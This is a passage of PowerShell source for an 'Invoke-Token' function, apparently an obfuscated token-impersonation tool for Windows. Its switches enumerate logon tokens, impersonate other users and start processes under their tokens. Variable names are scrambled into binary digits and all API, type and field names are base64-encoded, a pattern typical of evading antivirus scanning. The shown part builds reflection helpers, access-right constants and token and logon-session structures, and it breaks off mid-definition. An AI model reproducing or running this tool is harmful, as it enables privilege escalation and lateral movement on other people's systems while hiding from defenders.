function Invoke-Token
{
    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,
        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,
        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,
        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,
        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru
    )
    Set-StrictMode -Version 2
        Function _00000111101100101
        {
            Param
            (
                [OutputType([Type])]
                [Parameter( Position = 0)]
                [Type[]]
                ${_00101000100010000} = (New-Object Type[](0)),
                [Parameter( Position = 1 )]
                [Type]
                ${_01110010000000010} = [Void]
            )
            ${10100010111001100} = [AppDomain]::CurrentDomain
            ${00010101001101110} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
            ${01011011101001110} = ${10100010111001100}.DefineDynamicAssembly(${00010101001101110}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            ${10111110010100100} = ${01011011101001110}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
            ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
            ${01111000100001100} = ${00000111011101110}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${_00101000100010000})
            ${01111000100001100}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            ${01100100000000010} = ${00000111011101110}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_01110010000000010}, ${_00101000100010000})
            ${01100100000000010}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            echo ${00000111011101110}.CreateType()
        }
        Function _01100001000111010
        {
            Param
            (
                [OutputType([IntPtr])]
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                ${_10111111000110000},
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                ${_00010101111111001}
            )
            ${10001110000101010} = [AppDomain]::CurrentDomain.GetAssemblies() |
                ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
            ${10011110110000101} = ${10001110000101010}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
            ${00001000101110111} = ${10011110110000101}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
            ${01010111100101110} = ${10011110110000101}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
            ${00100110100010010} = ${00001000101110111}.Invoke($null, @(${_10111111000110000}))
            ${01011011000011001} = New-Object IntPtr
            ${01011110011110100} = New-Object System.Runtime.InteropServices.HandleRef(${01011011000011001}, ${00100110100010010})
            echo ${01010111100101110}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${01011110011110100}, ${_00010101111111001}))
        }
    ${10100111101010101} = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }
    ${01101010111011110} = New-Object PSObject -Property ${10100111101010101}
        ${10100010111001100} = [AppDomain]::CurrentDomain
        ${00000011101011111} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
        ${01011011101001110} = ${10100010111001100}.DefineDynamicAssembly(${00000011101011111}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${10111110010100100} = ${01011011101001110}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
        ${01110100100111011} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        ${00000111011101110} = ${10111110010100100}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AQwBMAEEAUwBTAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt32])
        ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIA'))), [UInt32] 1) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))), [UInt32] 2) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 3) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AdwBuAGUAcgA='))), [UInt32] 4) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAG0AYQByAHkARwByAG8AdQBwAA=='))), [UInt32] 5) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQBmAGEAdQBsAHQARABhAGMAbAA='))), [UInt32] 6) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAbwB1AHIAYwBlAA=='))), [UInt32] 7) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32] 8) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAA=='))), [UInt32] 9) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAdABhAHQAaQBzAHQAaQBjAHMA'))), [UInt32] 10) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAUwBpAGQAcwA='))), [UInt32] 11) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4ASQBkAA=='))), [UInt32] 12) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAEEAbgBkAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 13) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4AUgBlAGYAZQByAGUAbgBjAGUA'))), [UInt32] 14) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAYQBuAGQAQgBvAHgASQBuAGUAcgB0AA=='))), [UInt32] 15) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAdQBkAGkAdABQAG8AbABpAGMAeQA='))), [UInt32] 16) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AcgBpAGcAaQBuAA=='))), [UInt32] 17) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAFQAeQBwAGUA'))), [UInt32] 18) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAaQBuAGsAZQBkAFQAbwBrAGUAbgA='))), [UInt32] 19) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAA=='))), [UInt32] 20) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBzAFIAZQBzAHQAcgBpAGMAdABpAG8AbgBzAA=='))), [UInt32] 21) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAYwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgA='))), [UInt32] 22) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBBAGwAbABvAHcAZQBkAA=='))), [UInt32] 23) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBFAG4AYQBiAGwAZQBkAA=='))), [UInt32] 24) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbgB0AGUAZwByAGkAdAB5AEwAZQB2AGUAbAA='))), [UInt32] 25) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUASQBBAGMAYwBlAHMAcwA='))), [UInt32] 26) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE0AYQBuAGQAYQB0AG8AcgB5AFAAbwBsAGkAYwB5AA=='))), [UInt32] 27) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAbwBnAG8AbgBTAGkAZAA='))), [UInt32] 28) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBBAHAAcABDAG8AbgB0AGEAaQBuAGUAcgA='))), [UInt32] 29) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEMAYQBwAGEAYgBpAGwAaQB0AGkAZQBzAA=='))), [UInt32] 30) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAFMAaQBkAA=='))), [UInt32] 31) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAE4AdQBtAGIAZQByAA=='))), [UInt32] 32) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 33) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEMAbABhAGkAbQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 34) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAVQBzAGUAcgBDAGwAYQBpAG0AQQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32] 35) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 36) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEcAcgBvAHUAcABzAA=='))), [UInt32] 37) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUARwByAG8AdQBwAHMA'))), [UInt32] 38) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBjAHUAcgBpAHQAeQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 39) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBSAGUAcwB0AHIAaQBjAHQAZQBkAA=='))), [UInt32] 40) | Out-Null
    ${00000111011101110}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAVABvAGsAZQBuAEkAbgBmAG8AQwBsAGEAcwBzAA=='))), [UInt32] 41) | Out-Null
        ${10010010001100101} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABBAFIARwBFAF8ASQBOAFQARQBHAEUAUgA='))), ${10010101001101010}, [System.ValueType], 8)
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${10000101100100110} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${10010101001101010}, [System.ValueType], 8)
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00101000100001011} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUwBUAEEAVABJAFMAVABJAEMAUwA='))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAZAA='))), ${00101000100001011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAEkAZAA='))), ${00101000100001011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAaQByAGEAdABpAG8AbgBUAGkAbQBlAA=='))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBMAGUAdgBlAGwA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBDAGgAYQByAGcAZQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHYAYQBpAGwAYQBiAGwAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEMAbwB1AG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAGkAZQBkAEkAZAA='))), ${00101000100001011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${10100110011010111} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBVAE4ASQBDAE8ARABFAF8AUwBUAFIASQBOAEcA'))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBMAGUAbgBnAHQAaAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000101011010100} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBMAEEAUwBUAF8ASQBOAFQARQBSAF8ATABPAEcATwBOAF8ASQBOAEYATwA='))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABTAHUAYwBjAGUAcwBzAGYAdQBsAEwAbwBnAG8AbgA='))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABGAGEAaQBsAGUAZABMAG8AZwBvAG4A'))), ${10000101100100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAQQB0AHQAZQBtAHAAdABDAG8AdQBuAHQAUwBpAG4AYwBlAEwAYQBzAHQAUwB1AGMAYwBlAHMAcwBmAHUAbABMAG8AZwBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${01010011000010011} = ${00000111011101110}.CreateType()
    ${10010101001101010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
        ${00000111011101110} = ${10111110010100100}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEMAVQBSAEkAVABZAF8ATABPAEcATwBOAF8AUwBFAFMAUwBJAE8ATgBfAEQAQQBUAEEA'))), ${10010101001101010}, [System.ValueType])
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEkARAA='))), ${00101000100001011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${00000111011101110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEQAbwBtAGEAaQBuAA=='))), ${00000101011010100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
